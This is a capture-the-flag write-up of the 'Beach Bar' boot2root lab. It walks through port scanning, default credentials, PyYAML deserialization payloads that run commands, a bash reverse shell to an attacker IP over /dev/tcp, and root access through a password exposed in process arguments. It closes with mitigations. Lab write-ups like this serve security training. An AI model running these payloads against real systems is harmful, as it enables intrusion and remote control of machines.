# Beach Bar CTF - Writeup

## Challenge Overview
**Type:** Boot2Root  
**Target:** 10.112.150.122  
**Objective:** Gain user and root access to extract flags

---

## Reconnaissance

### Initial Port Scan
```bash
nmap 10.112.150.122
```

**Key Finding:** Port 80 open with `http-server-header: gunicorn`

**Initial Analysis:**  
Gunicorn is a Python Web Server Gateway Interface (WSGI). This indicated a Python-based web application, suggesting potential vulnerabilities related to Python deserialization attacks.

---

## Exploitation - User Flag

### 1. Web Application Discovery
- Navigated to `http://10.112.150.122`
- Discovered a **login page**
- Inspected network requests to identify available endpoints

### 2. Credential Discovery
- Found default credentials in network inspection: `dj:dj`
- Successfully authenticated to the web application

### 3. Feature Enumeration
After login, discovered the application allowed:
- YAML file import
- YAML file export

This feature is critical for exploitation.

### 4. YAML Deserialization Vulnerability Research
**Vulnerability:** Python YAML Deserialization RCE (PyYAML)

When Python's `yaml.load()` is used without safe mode, it can deserialize arbitrary Python objects, leading to Remote Code Execution.

**Proof of Concept - Testing Execution:**
```yaml
name: !!python/object/apply:time.sleep [10]
```
When exported, the application slept for 10 seconds, confirming code execution was possible.

### 5. Command Execution Development
Initial reverse shell attempts failed. Pivoted to using `subprocess.check_output()` for command execution:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: !!python/object/apply:subprocess.check_output [['ls', '-a', '/home/bartender']]
  vibe: !!python/object/apply:subprocess.check_output [["cat", "/home/bartender/user.txt"]]
```

**Result:** Successfully retrieved the first flag from `/home/bartender/user.txt`

---

## Exploitation - Root Flag

### 1. Reverse Shell Establishment
Initial reverse shells failed. Success came with:

```yaml
# Beach Bar jukebox playlist export
playlist:
  vibe: !!python/object/apply:subprocess.Popen [['/bin/bash', '-c', 'bash -i >& /dev/tcp/192.168.146.215/4444 0>&1']]
```

**Listener:** `nc -lvnp 4444`

Successfully established interactive shell access as the application user.

### 2. Privilege Escalation Research
Checked common privilege escalation vectors:
- `sudo -l` → No sudo privileges available
- System version check: `lsb_release -a` → Ubuntu 24.04 Noble LTS
- Attempted known CVE (Copy-Fail) → Not applicable

### 3. Challenge Hint Analysis
Re-read challenge description:
> "The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached."

**Key Insight:** "Jukebox" and "trimmings still attached" → configuration files with credentials

### 4. Process Analysis
Explored `/opt/beach-bar` directory and examined `jukeboxd.py`

Identified `--stream-pass` function parameter in the code

**Critical Discovery:**
```bash
ps aux | grep stream
```

Found running process with embedded credentials: **`SunsetSpritz2024!`**

### 5. Root Access
```bash
su root
# Password: SunsetSpritz2024!
ls /root
cat /root/root.txt
```

**Result:** Successfully retrieved the final flag from `/root/root.txt`

---

## Key Takeaways

| Stage | Vulnerability | Solution |
|-------|---|---|
| Access | Default Credentials | dj:dj |
| User Flag | YAML Deserialization RCE | PyYAML unsafe.load() |
| Execution | Command Injection | subprocess.check_output/Popen |
| Root Flag | Exposed Credentials | Hardcoded password in process args |

---

## Tools Used
- `nmap` - Port scanning
- `curl/browser` - Web interaction
- `nc` - Reverse shell listener
- `bash` - Shell scripting
- `ps` - Process analysis

---

## Summary
The Beach Bar challenge demonstrated the critical risks of:
1. **Insecure Python deserialization** (YAML without safe mode)
2. **Default/weak credentials**
3. **Exposing sensitive data** in process arguments
4. **Lack of privilege isolation** between application and system users

Proper mitigations include using `yaml.safe_load()`, credential rotation, and hardening process execution environments.